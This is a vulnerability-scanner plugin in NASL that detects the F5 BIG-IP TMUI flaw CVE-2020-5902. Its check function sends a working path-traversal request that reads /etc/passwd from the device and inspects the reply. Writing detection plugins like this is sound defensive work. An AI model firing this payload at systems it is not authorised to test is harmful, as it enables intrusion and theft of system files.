#
#
#

include("compat.inc");


if (description)
{
  script_id(51799266);
  script_version("1.11");
  script_cve_id("CVE-2020-5902");
  script_name(english:"F5 Networks BIG-IP RCE");
  script_summary(english:"F5 Networks BIG-IP RCE");

  script_set_attribute(attribute:"synopsis", value:"In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.");
  script_set_attribute(attribute:"description", value:"In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.");
  script_set_attribute(attribute:"solution", value:"update: https://support.f5.com/csp/article/K52145254.");

  script_set_attribute(attribute:"risk_factor", value:"High");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2009-2018 Webray Security, Inc.");

  script_dependencies("http_version.nasl", "bigip_web_detects.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


wport = get_kb_item("Services/www");
ssl_ports= get_kb_list("SSL/Transport/"+wport);
if (ssl_ports){
   if(get_kb_item("www/bigip")) check_vuln_ssl(port:wport);
}


function check_vuln_ssl(port){
	url = string("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd");
	req = http_get(item:url, port:port);
	ssl_req = https_req_get(port:port , request:req);
	if( ssl_req == NULL) exit(0);
	if("200 OK"><ssl_req && '{"output":' ><ssl_req && "root:x:0:0:root:" >< ssl_req){
		security_hole(port:port, extra:req+'\n\n'+ssl_req);
	}
}


exit(0, "The web server on port "+port+" is not affected.");
